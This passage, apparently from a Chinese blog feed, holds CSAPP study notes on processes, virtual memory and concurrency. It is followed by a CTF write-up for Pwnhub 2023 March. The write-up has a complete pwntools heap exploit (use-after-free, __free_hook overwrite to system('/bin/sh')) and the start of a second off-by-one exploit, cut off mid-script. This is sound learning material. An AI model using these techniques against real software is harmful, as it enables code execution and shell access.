进程"></a>8.2 进程</h2><p>进程是一个执行中程序的实例.系统中每个程序都运行在某个进程的上下文中.</p><h3 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h3><p>处理器用某个控制寄存器的一个模式位来标识运行模式.<br>linux提供/proc文件系统,允许用户模式进程访问内核数据结构内容.</p><h4 id="proc文件系统-待补充"><a href="#proc文件系统-待补充" class="headerlink" title="/proc文件系统 待补充"></a>/proc文件系统 待补充</h4><h3 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h3><p>内核为每个进程维持一个上下文.上下文是内核重新启动一个被抢占的进程所需的状态.也是程序正确运行所必须的状态.<br>在进程的某些时刻,内核可以决定抢占当前进程,并重新开始一个先前被抢占的进程.这种决策叫做调度,由内核中称为调度器的代码处理.</p><h2 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h2><p>当系统级函数遇到错误时,通常会设置全局整型变量errno,可以通过错误报告函数(输出错误信息,处理错误或退出程序)以及错误处理包装函数(将可能发生错误的函数和错误处理函数封装到一起)来处理错误同时防止代码臃肿.</p><h2 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h2><h3 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050013956.png"></p><h3 id="8-4-5加载并运行程序"><a href="#8-4-5加载并运行程序" class="headerlink" title="8.4.5加载并运行程序"></a>8.4.5加载并运行程序</h3><p>execve函数在当前进程的上下文中加载并运行一个新程序</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt; unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename,<span class="type">const</span> <span class="type">char</span>* argv[],<span class="type">const</span> <span class="type">char</span>* envp[])</span>;</span><br></pre></td></tr></tbody></table></figure><p>execve函数调用一次且只在发生错误(如找不到filename对应文件)才返回到调用程序.<br>argv变量指向一个以null结尾的指针数组,每个指针指向一个参数字符串,argv[0]为可执行目标文件的名字.envp指向一个以null结尾的指针数组,每个指针指向一个环境变量字符串,每个串都是形如”name=value”的名字-值对.<br>在execve加载了filename后,调用启动代码,将控制传递给新程序的主函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050022890.png"></p><h3 id="程序与进程"><a href="#程序与进程" class="headerlink" title="程序与进程"></a>程序与进程</h3><p>程序是一堆代码和数据,可以作为目标文件存在于磁盘上,或者作为段存在于地址空间中.进程时执行中程序的一个实例.</p><h3 id="利用fork和execve运行程序"><a href="#利用fork和execve运行程序" class="headerlink" title="利用fork和execve运行程序"></a>利用fork和execve运行程序</h3><h2 id="8-5-信号-重点且内容多-翻书查阅"><a href="#8-5-信号-重点且内容多-翻书查阅" class="headerlink" title="8.5 信号 (重点且内容多,翻书查阅)"></a>8.5 信号 (重点且内容多,翻书查阅)</h2><p>信号是更高层的软件形式的异常,低层的硬件异常是由内核异常处理程序处理的,正常情况下对用户进程不可见.信号提供一种机制,通知用户进程发生了这些异常.</p><h3 id="8-5-1-信号术语"><a href="#8-5-1-信号术语" class="headerlink" title="8.5.1 信号术语"></a>8.5.1 信号术语</h3><p>接收信号:当目的进程被内核强迫以某种方式对信号作出反应时,它就接收了信号.一个发出而没有被接收的信号叫待处理信号.在任何时刻,一种类型至多只会有一个待处理信号.如果一个进程由有一个类型为k的待处理信号,那么任何接下来发送到这个进程的类型k的信号都不会排队等待,而是被直接丢弃.(如果当前进程正在执行k的信号处理程序,此时再次收到信号k,该信号会排队等待而不是丢弃)<br>实时信号将不会被丢弃,而是多次注册.</p><p>捕获信号:调用信号处理程序<br>处理信号:执行信号处理程序</p><p>进程只有处理完信号才会返回用户态，进程在用户态下不会有未处理完的信号.<br>如果进程收到一个要捕捉的信号，那么进程从内核态返回用户态时执行用户定义的函数。而且执行用户定义的函数的方法很巧妙，内核是在用户栈上创建一个新的层，该层中将返回地址的值设置成用户定义的处理函数的地址，这样进程从内核返回弹出栈顶时就返回到用户定义的函数处，从函数返回再弹出栈顶时，才返回原先进入内核的地方。这样做的原因是用户定义的处理函数不能且不允许在内核态下执行(如果用户定义的函数在内核态下运行的话，用户就可以获得任何权限)</p><h2 id="8-6-非本地跳转"><a href="#8-6-非本地跳转" class="headerlink" title="8.6 非本地跳转"></a>8.6 非本地跳转</h2><p>setjmp(jmp_buf env),sigsetjmp(sigjmp_buf env,int savesigs)在参数env中保存当前调用环境.调用时返回0.且任何情形下返回值不能赋给变量.<br>(sigsetjmp保存的环境还包括信号的上下文:待处理的和被阻塞的信号向量)</p><p>longjmp(jmp_buf env,int retval)函数从env中恢复最近一次初始化该env的setjmp调用保存的环境,然后从setjmp返回,并带有非零的返回值retval.</p><p>也就是说,setjmp调用一次返回多次,longjmp调用一次,但从不返回.</p><p>非本地跳转的一个重要应用就是允许从一个深层嵌套的函数调用中立即返回.(比如检测到错误后立即跳转到错误处理程序而不是费力地解开调用栈.)</p><p>C++和Java地异常机制是较高层次的.catch类似于setjmp,throw类似于longjmp.</p><h1 id="第九章-虚拟内存"><a href="#第九章-虚拟内存" class="headerlink" title="第九章 虚拟内存"></a>第九章 虚拟内存</h1><h2 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h2><p>使用虚拟寻址,CPU通过生成一个虚拟地址(VA)来访问主存,该虚拟地址被CPU上芯片上的内存管理单元(利用存放在主存中的页表)翻译为物理地址.</p><h2 id="9-3-虚拟内存作为缓存的工具"><a href="#9-3-虚拟内存作为缓存的工具" class="headerlink" title="9.3 虚拟内存作为缓存的工具"></a>9.3 虚拟内存作为缓存的工具</h2><p>VM系统将虚拟内存分割为虚拟页(VP)作为主存和磁盘之间的传输单元.类似的,物理内存被分割为物理页(PP),大小与VP相同.物理页也被称为页帧(page frame)<br>在任意时刻虚拟页面的集合都分为三个不相交的子集:</p><ol><li>未分配的:VM还未分配或创建的页.未分配的页没有任何数据和它们相关联,因此也就不占用任何磁盘空间.</li><li>缓存的:当前已缓存在物理内存中的已分配页</li><li>未缓存的:未缓存在物理内存中的已分配页(即只存在于磁盘上)</li></ol><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>虚拟内存系统必须有某种方法判定一个虚拟页是否缓存在DRAM中的某个地方.如果是,系统还必须确定这个虚拟页存放在哪个物理页中.如果不命中,系统必须判断这个虚拟页存放在磁盘的哪个位置.在物理内存中选择一个牺牲页,并将虚拟页从磁盘复制到DRAM中,替换这个牺牲页.</p><p>页表存放在物理内存中,将虚拟页映射到物理页.每次地址翻译时都会读取页表.操作系统负责维护页表内容,以及在磁盘与DRAM之间来回传送页.<br>页表是一个页表条目(PTE)的数组.虚拟地址空间的每个页在页表中一个固定偏移量处都有一个PTE.</p><p>简化后的页表示意图:<br>将每个PTE简化为一个有效位和一个n位地址字段.<br>若有效位为1,说明该条目对应的虚拟页缓存在物理内存中,地址字段保存该物理页的物理页号.<br>若有效位为0,说明该条目对应虚拟页未缓存.地址字段表示该虚拟页对应的磁盘地址,若为空表示该虚拟页还未分配.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191358796.jpg"></p><h3 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h3><p>DRAM缓存不命中称为缺页.<br>缺页后触发缺页异常,调用内核中的缺页异常处理程序,选择一个牺牲页进行替换(页面调度)并修改页表.若该牺牲页已经被修改过了,那么内核会将它复制回磁盘.<br>(言外之意就是,其实物理内存中的已经缓存的页在磁盘中也有一个副本,要是没修改过就不用更新,不过已分配页的磁盘地址保存在哪?)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191403569.jpg"></p><h3 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h3><p>局部性原则保证了在任意时刻,程序趋向于在一个较小的活动页面集合上工作,这个集合叫做工作集或者常驻集合.如果工作集的大小超出了物理内存的大小,就产生”抖动”.</p><h2 id="9-6-地址翻译"><a href="#9-6-地址翻译" class="headerlink" title="9.6 地址翻译"></a>9.6 地址翻译</h2><p>口述一遍这个图的流程,每个流程是怎么实现的以及每一个流程的目的,为什么能加快速度或节约物理内存,地址翻译也就差不多搞清楚了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191759005.jpg"></p><h2 id="9-8-内存映射"><a href="#9-8-内存映射" class="headerlink" title="9.8 内存映射"></a>9.8 内存映射</h2><h3 id="内存映射与对象"><a href="#内存映射与对象" class="headerlink" title="内存映射与对象"></a>内存映射与对象</h3><p>Linux通过将一个虚拟内存区域与一个磁盘上的对象关联起来,以初始化这个虚拟内存区域的内容,这个过程称为写时映射.(对象分为普通文件和匿名文件)<br>如果一个进程将一个共享对象映射到它的虚拟地址空间的一个区域内,那么这个进程对这个区域的任何些操作,对于任何映射了这个共享对象的其他进程也是可见的.而且这些变化也会反映在磁盘上的原始对象中.<br>对于一个映射到私有对象的区域所作的改变,对其他进程来说是不可见的.并且进程对这个区域做的所有操作都不会反映在磁盘的对象中.(对这一点的理解,比如pwn题你改了bss段的数据,可执行文件改变了吗?)</p><p>当两个进程将同一个私有对象映射到虚拟内存中时,共享这个对象的同一个物理副本.该区域在每个进程的页表条目中都被标记为只读.当一个进程试图写这个区域时触发缺页异常,异常处理程序发现该异常是由于对<code>"私有的写时复制区域中的一个页面"</code>的写造成的,就会在物理内存中创建这个页面的一个新副本,更新该进程的页表条目指向这个新副本,恢复该页面的可写权限.</p><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>当fork被进程调用,内核为新进程创建各种数据结构.创建了当前进程的mm_struct、区域结构和页表的原样副本,并将两个进程中的每个页面都标记为只读,每个区域结构都标记为私有的写时复制.(父子进程私有地址空间的原理)</p><blockquote><p>提问:既然都标为只读和私有的写时复制了,那父子进程都进行写操作后,不久存三个物理副本了?这不是浪费吗…<br>答:”进程对私有对象的区域所作的改变不会反映在磁盘对象中”,也就是说就算你只有一个进程,进行写的时候也会产生副本,因为改变不能反映在磁盘对象中</p></blockquote><h3 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h3><p>从内存映射的视角再看execve做了些什么.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">execve</span>(<span class="string">"a.out"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure><ol><li>删除已存在的用户区域,删除当前进程虚拟地址的用户部分中的已存在的区域结构</li><li>映射私有区域,为新程序的代码、数据、bss和栈区域创建新的数据结构.代码和数据区域被映射为可执行文件中的.text和.data区,bss段是请求二进制零的,映射到匿名文件.(这里可以与C/C++中的变量存储联系起来,什么样的变量会存到bss段?未初始化的静态变量和初始化为0的全局(或静态)变量)</li><li>映射共享区域.libc.so之类的.</li><li>设置程序计数器(PC),指向代码区域的入口点.<br>当然这只是完成了映射,当开始执行时,才调度页面进入主存.</li></ol><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>Linux进程可以使用mmap创建新的虚拟内存区域,并将对象映到这些区域中.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="title">mmap</span><span class="params">(<span class="type">void</span>* start,<span class="type">size_t</span> lenth,<span class="type">int</span> prot,<span class="type">int</span> flags,<span class="type">int</span> fd,<span class="type">off_t</span> offset)</span></span></span><br><span class="line"><span class="function"><span class="comment">//start:新区域的起始地址</span></span></span><br><span class="line"><span class="function"><span class="comment">//prot:权限</span></span></span><br><span class="line"><span class="function"><span class="comment">//flags:对象类型,MAP_ANON,MAP_SHARED,MAP_PRIVATE</span></span></span><br><span class="line"><span class="function"><span class="comment">//fd:文件描述符(回想一下内存映射的对象就是文件)</span></span></span><br><span class="line"><span class="function"><span class="comment">//offset:映射开始位置相对文件起始位置的偏移量</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">munmap</span><span class="params">(<span class="type">void</span>* start,<span class="type">size_t</span> lenth)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="9-9-动态内存分配"><a href="#9-9-动态内存分配" class="headerlink" title="9.9 动态内存分配"></a>9.9 动态内存分配</h2><h3 id="9-9-3-分配器的要求和目标"><a href="#9-9-3-分配器的要求和目标" class="headerlink" title="9.9.3 分配器的要求和目标"></a>9.9.3 分配器的要求和目标</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ol><li>处理任意请求序列</li><li>立即响应请求</li><li>只使用堆</li><li>对齐块</li><li>不修改已分配的块</li></ol><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ol><li>最大化吞吐率</li><li>最大化内存利用率</li></ol><h3 id="9-9-5-实现问题"><a href="#9-9-5-实现问题" class="headerlink" title="9.9.5 实现问题"></a>9.9.5 实现问题</h3><p>空闲块组织:如何记录空闲块<br>放置:如何选择合适的空闲块来放置新分配的块<br>分割:在一个新分配的块放置到某个空闲块之后,我们如何处理这个空闲块中的剩余部分?<br>合并:如何处理一个刚刚释放的块(如何处理内存中连续的多个空闲块)</p><h1 id="第十一章-网络编程"><a href="#第十一章-网络编程" class="headerlink" title="第十一章 网络编程"></a>第十一章 网络编程</h1><h2 id="11-1-客户端-服务器编程模型"><a href="#11-1-客户端-服务器编程模型" class="headerlink" title="11.1 客户端-服务器编程模型"></a>11.1 客户端-服务器编程模型</h2><p>每个网络应用都是基于客户端-服务器模型的.该模型的基本操作是事物.<br>一个事物由四步组成:</p><ol><li>客户端向服务器发送请求</li><li>服务器接收、解释请求,以适当的方式操作它的资源.</li><li>服务器给客户端发送一个响应,等待下一个请求.</li><li>客户端收到响应并处理它.</li></ol><h2 id="11-3"><a href="#11-3" class="headerlink" title="11.3"></a>11.3</h2><p>数据可以同时双向流动,它是全双工的.<br>一个套接字是连接的一个断点.每个套接字都有相应的套接字地址.当客户端发起一个连接请求,客户端套接字地址的端口是由内核自动分配的,称为临时端口.<br>一个连接是由它两端的套接字地址唯一确定的.这对套接字地址叫做套接字对.<br>(cliaddr:cliport,servaddr:servport)</p><h1 id="第十二章-并发编程"><a href="#第十二章-并发编程" class="headerlink" title="第十二章 并发编程"></a>第十二章 并发编程</h1><p>互斥（mutualexclusion）:保证一个线程在临界区执行时，其他线程应该被阻止进入临界区.互斥也并不是只针对多线程。在多进程竞争共享资源的时候，也同样是可以使用互斥的方式来避免资源竞争造成的资源混乱。<br>同步，就是并发进程/线程在一些关键点上可能需要互相等待与互通消息，这种相互制约的等待与互通信息称为进程/线程同步。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306261127339.png"></p><p>互斥一般用锁来实现,同步用信号量来实现.信号量同时也可以用作互斥锁.</p><h2 id="12-5-用信号量同步线程"><a href="#12-5-用信号量同步线程" class="headerlink" title="12.5 用信号量同步线程"></a>12.5 用信号量同步线程</h2><h3 id="12-5-4-利用信号量来调度共享资源"><a href="#12-5-4-利用信号量来调度共享资源" class="headerlink" title="12.5.4 利用信号量来调度共享资源"></a>12.5.4 利用信号量来调度共享资源</h3><h4 id="生产者-消费者问题"><a href="#生产者-消费者问题" class="headerlink" title="生产者-消费者问题"></a>生产者-消费者问题</h4><h5 id="CSAPP实例程序中多个P-V操作的顺序问题"><a href="#CSAPP实例程序中多个P-V操作的顺序问题" class="headerlink" title="CSAPP实例程序中多个P,V操作的顺序问题"></a>CSAPP实例程序中多个P,V操作的顺序问题</h5><p>P的顺序是不可交换的,一定是先P可用槽数量或可用数据的信号量,再P互斥锁.否则当互斥锁上锁之后再发现无可用槽或数据,该线程阻塞,而此时对应的生产者/消费者线程由于无法互斥锁上锁同样阻塞,形成死锁.也就是说,互斥锁的上锁一定是在判断完其他条件之后,在正式访问、更改数据之前的最后一个操作.</p><p>V的顺序是可交换的,但类似示例程序的情形还是推荐先解锁.对于该次Insert后槽已填满的情况,V(slots)的行为的速度对其他线程并无影响.但互斥锁会阻塞消费者读取数据.所以先解锁再V(slots)可以加快消费者的速度,尽量减少槽被填满后下次生产者的阻塞.</p><h4 id="读者写者问题"><a href="#读者写者问题" class="headerlink" title="读者写者问题"></a>读者写者问题</h4><blockquote><pre><code>「读-读」允许：同一时刻，允许多个读者同时读「读-写」互斥：没有写者时读者才能读，没有读者时写者才能写「写-写」互斥：没有其他写者时，写者才能写</code></pre></blockquote><h4 id="生产者消费者区别和读者写者问题的区别"><a href="#生产者消费者区别和读者写者问题的区别" class="headerlink" title="生产者消费者区别和读者写者问题的区别"></a>生产者消费者区别和读者写者问题的区别</h4><p>前者用于数据生成和消费分离的场景,后者适用于读操作和写操作分离的场景.<br>多个读者可以同时读取共享数据.多个生产者不能同时完成生产.<br><a href="https://zhuanlan.zhihu.com/p/161936748">https://zhuanlan.zhihu.com/p/161936748</a></p><h3 id="12-7-5-死锁"><a href="#12-7-5-死锁" class="headerlink" title="12.7.5 死锁"></a>12.7.5 死锁</h3><p>如果每个线程都是以一种顺序获得互斥锁并已相反的顺序释放,那么这个程序就是无死锁的.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnhub 2023 3月公开赛 WP</title>
      <link href="/2023/Pwnhub-2023-March-WP/"/>
      <url>/2023/Pwnhub-2023-March-WP/</url>
      
        <content type="html"><![CDATA[<p>Pwnhub 2023 3月公开赛 WP</p><h2 id="sh-v1-1"><a href="#sh-v1-1" class="headerlink" title="sh_v1_1"></a>sh_v1_1</h2><p>glibc2.31堆题<br>一堆莫名其妙的全局变量运算,白看了半天最后发现一点用都没有.<br>恢复一下结构体</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>{</span></span><br><span class="line"><span class="type">long</span> flag;</span><br><span class="line"><span class="type">char</span> filename[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span>* content_ptr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序逻辑就是模拟的一个linux终端,输入命令进行相应处理.<br>漏洞在ln的时候可以备份指针造成uaf</p><span id="more"></span><p>先free两个堆块进tcache,然后uaf部分覆写next指针指向另一个堆块的size域,改成0x421放进unsortedbin泄露libc地址.<br>之后正常打free_hook就行了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func,addr</span>):</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">global</span> libc,libc_base,system_addr,binsh_addr,realloc_addr,free_hook_addr,onegadget</span><br><span class="line">&nbsp; &nbsp; libc = finder(func,addr)</span><br><span class="line">&nbsp; &nbsp; libc_base = libc.libcbase</span><br><span class="line">&nbsp; &nbsp; realloc_addr = libc.dump(<span class="string">'realloc'</span>)</span><br><span class="line">&nbsp; &nbsp; system_addr = libc.dump(<span class="string">'system'</span>)</span><br><span class="line">&nbsp; &nbsp; malloc_hook_addr = libc.dump(<span class="string">'__malloc_hook'</span>)</span><br><span class="line">&nbsp; &nbsp; free_hook_addr = libc.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">&nbsp; &nbsp; binsh_addr=libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">&nbsp; &nbsp; <span class="comment"># onegadget = libc.ogg(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">file,content</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'touch '</span>+file)</span><br><span class="line">&nbsp; &nbsp; sleep(<span class="number">0.1</span>)</span><br><span class="line">&nbsp; &nbsp; io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cp</span>(<span class="params">file1,file2</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'cp '</span>+file1+<span class="string">' '</span>+file2)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gedit</span>(<span class="params">file,content</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'gedit '</span>+file)</span><br><span class="line">&nbsp; &nbsp; sleep(<span class="number">0.1</span>)</span><br><span class="line">&nbsp; &nbsp; io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>():</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'ls'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">file</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'cat '</span>+file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">file</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'rm '</span>+file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ln</span>(<span class="params">file1,file2</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'ln '</span>+file1+<span class="string">' '</span>+file2)</span><br><span class="line"></span><br><span class="line">touch(<span class="string">'1'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'2'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'3'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'4'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'5'</span>,<span class="string">'a'</span>)</span><br><span class="line">ln(<span class="string">'1'</span>,<span class="string">'1_ln'</span>)</span><br><span class="line">ln(<span class="string">'1'</span>,<span class="string">'1_ln2'</span>)</span><br><span class="line">ln(<span class="string">'2'</span>,<span class="string">'2_ln'</span>)</span><br><span class="line">ln(<span class="string">'3'</span>,<span class="string">'3_ln'</span>)</span><br><span class="line">rm(<span class="string">'2'</span>)</span><br><span class="line">rm(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">cat(<span class="string">'1_ln'</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0x4b0</span></span><br><span class="line">log.success(<span class="string">"heap_base is -&gt; "</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">gedit(<span class="string">'1_ln'</span>,<span class="string">'\xa0'</span>)</span><br><span class="line">touch(<span class="string">'6'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'420'</span>,flat([<span class="number">0</span>,<span class="number">0x421</span>]))</span><br><span class="line">ln(<span class="string">'420'</span>,<span class="string">'420_ln'</span>)</span><br><span class="line">rm(<span class="string">'2_ln'</span>)</span><br><span class="line">gedit(<span class="string">'420_ln'</span>,<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">cat(<span class="string">'420_ln'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span></span><br><span class="line">find_libc(<span class="string">'__malloc_hook'</span>,main_arena-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">gedit(<span class="string">'420_ln'</span>,flat([<span class="number">0</span>,<span class="number">0x421</span>]))</span><br><span class="line">rm(<span class="string">'5'</span>)</span><br><span class="line">rm(<span class="string">'1_ln2'</span>)</span><br><span class="line">gedit(<span class="string">'1_ln'</span>,p64(free_hook_addr))</span><br><span class="line">touch(<span class="string">'HanQi'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">touch(<span class="string">'pwn'</span>,p64(system_addr))</span><br><span class="line">rm(<span class="string">'HanQi'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h2><p>intro的时候可以泄露栈地址和libc地址.<br>栈地址只要填满buf就可以顺带出来,<br>而libc地址得益于scanf的匹配机制.<br>scanf(“%d”,&amp;v1);时若接收到无法匹配的数据,v1的值将不会被改变.<br>将原始的v1和v2分成高低部分赋给v8,gdb发现是一个_IO_file_jumps的地址<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303130942054.png"><br>然后是正常的堆操作,edit的时候有个offbyone,overlap打free_hook就行<br>(偶然发现最后直接free掉free_hook那个堆块而不是’/bin/sh’那个也能getshell,不太懂)</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">intro(<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="string">'-'</span>,<span class="string">'-'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">rbp = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">io.recvuntil(<span class="string">'age: '</span>)</span><br><span class="line">IO_file_jumps_low = <span class="built_in">int</span>(io.recv(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">if</span> IO_file_jumps_low&lt;<span class="number">0</span>:</span><br><span class="line">&nbsp; &nbsp; IO_file_jumps_low += <span class="number">0x100000000</span></span><br><span class="line">io.recvuntil(<span class="string">'high: '</span>)</span><br><span class="line">IO_file_jumps_high = <span class="built_in">int</span>(io.recv(<span class="number">5</span>))</span><br><span class="line">IO_file_jumps = IO_file_jumps_low+(IO_file_jumps_high&lt;&lt;<span class="number">32</span>)</span><br><span class="line">find_libc(<span class="string">'_IO_file_jumps'</span>,IO_file_jumps)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x38</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,flat([<span class="string">'a'</span>*<span class="number">0x40</span>,<span class="number">0x50</span>,<span class="string">b'\x71'</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span 